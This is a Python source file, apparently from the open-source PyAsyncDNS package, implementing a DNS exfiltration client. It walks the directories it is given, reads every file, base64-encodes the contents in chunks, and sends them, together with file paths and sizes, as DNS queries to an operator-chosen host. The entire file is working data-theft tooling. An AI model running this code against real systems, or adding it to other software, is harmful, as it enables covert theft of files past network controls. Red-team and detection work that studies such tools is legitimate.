#!/usr/bin/env python3
# -*- coding: utf-8 -*-

###################
#    This package implements a basic asynchronous DNS client and server
#    with a feature to exfiltrate data through DNS.
#    Copyright (C) 2025, 2026  PyAsyncDNS

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

"""
DNS exfiltration client.

Reads files/directories and sends chunks as base64-encoded DNS queries.
Uses the new dns_client low-level transport.
"""

__version__ = "1.0.0"
__author__ = "Maurice Lambert"
__author_email__ = "mauricelambert434@gmail.com"
__maintainer__ = "Maurice Lambert"
__maintainer_email__ = "mauricelambert434@gmail.com"
__description__ = """
This package implements a basic asynchronous DNS client and server
with a feature to exfiltrate data through DNS.
"""
__url__ = "https://github.com/mauricelambert/PyAsyncDNS"

__all__ = [
    "process_chunks",
    "read_and_chunk_file",
    "process_directory",
    "process_directories",
]

__license__ = "GPL-3.0 License"
__copyright__ = """
PyAsyncDNS  Copyright (C) 2025, 2026  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.
"""
copyright = __copyright__
license = __license__

from os import walk
from typing import List
from pathlib import Path
from asyncio import run, gather
from base64 import urlsafe_b64encode
from os.path import join, isdir, getsize
from sys import executable, stderr, argv, exit

if __package__:
    from .client import send_udp_raw, build_query
    from .datatypes import RecordType
else:
    from client import send_udp_raw, build_query
    from datatypes import RecordType


async def _send_chunk_query(domain: str, host: str, port: int, tid: int) -> None:
    packet = build_query(domain, RecordType.A, transaction_id=tid)
    await send_udp_raw(packet, host, port, timeout=2.0)


async def process_chunks(chunks: List[bytes], host: str, port: int, tid: int) -> None:
    """
    This function sends chunks as batch to exfiltrate file.
    """

    domain = ".".join(urlsafe_b64encode(x).decode() for x in chunks)
    await _send_chunk_query(domain, host, port, tid)


async def read_and_chunk_file(
    filepath: str,
    host: str,
    port: int,
    tid: int,
    chunk_size: int = 33,
    batch_size: int = 5,
) -> None:
    """
    This function reads a file and splits the content as chunks.
    """

    print(f"\n[exfil] Sending: {filepath} (id={hex(tid)})")
    meta_chunks = [x.encode() for x in Path(filepath).resolve().parts[1:]]
    meta_chunks.append(str(getsize(filepath)).encode())
    await process_chunks(meta_chunks, host, port, tid)

    try:
        with open(filepath, "rb") as f:
            batch = []
            while True:
                chunk = f.read(chunk_size)
                if not chunk:
                    break
                batch.append(chunk)
                if len(batch) == batch_size:
                    await process_chunks(batch, host, port, tid)
                    batch = []
            if batch:
                await process_chunks(batch, host, port, tid)
    except Exception as e:
        print(f"[exfil] Error reading {filepath}: {e}", file=stderr)


async def process_directory(
    directory: str,
    host: str,
    port: int,
    index: int = 1,
    chunk_size: int = 33,
    batch_size: int = 5,
) -> None:
    """
    This function exfiltrates a directory.
    """

    counter = 1
    for root, _, files in walk(directory):
        for filename in files:
            filepath = join(root, filename)
            tid = ((index << 12) & 0xF000) | (counter & 0x0FFF)
            await read_and_chunk_file(filepath, host, port, tid, chunk_size, batch_size)
            counter += 1


async def process_directories(directories: List[str], host: str, port: int) -> None:
    """
    This function exfiltrates multiples directories.
    """

    await gather(*(
        process_directory(d, host, port, i + 1)
        for i, d in enumerate(directories)
        if isdir(d)
    ))


def main() -> int:
    """
    The main function to start the exfiltration client.
    """

    print(__copyright__)

    if len(argv) < 4:
        print(f"Usage: {executable} {argv[0]} <host> <port> <dir...>", file=stderr)
        return 1
    if not argv[2].isdigit():
        print("Error: port must be an integer.", file=stderr)
        return 1
    run(process_directories(argv[3:], argv[1], int(argv[2])))
    return 0


if __name__ == "__main__":
    exit(main())
